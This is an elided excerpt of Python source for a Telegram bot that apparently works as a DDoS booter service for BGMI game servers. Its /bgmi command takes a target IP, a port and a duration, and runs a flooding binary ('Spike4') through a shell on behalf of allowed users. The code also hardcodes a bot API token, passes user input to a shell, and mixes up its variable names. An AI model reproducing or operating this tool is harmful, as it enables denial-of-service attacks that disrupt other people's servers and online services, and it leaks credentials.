...
bot = telebot.TeleBot('8135416985:AAHeSgmcT7eUyNHoUCyEsBQYYu8W_ThK0mc')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 1000:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 1000 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Spike4 {target_ip} {target_port} {duration} 150"
                subprocess.run(full_command, shell=True)
                response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
        else:
            response = "✅ 𝗘𝗻𝘁𝗲𝗿 :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
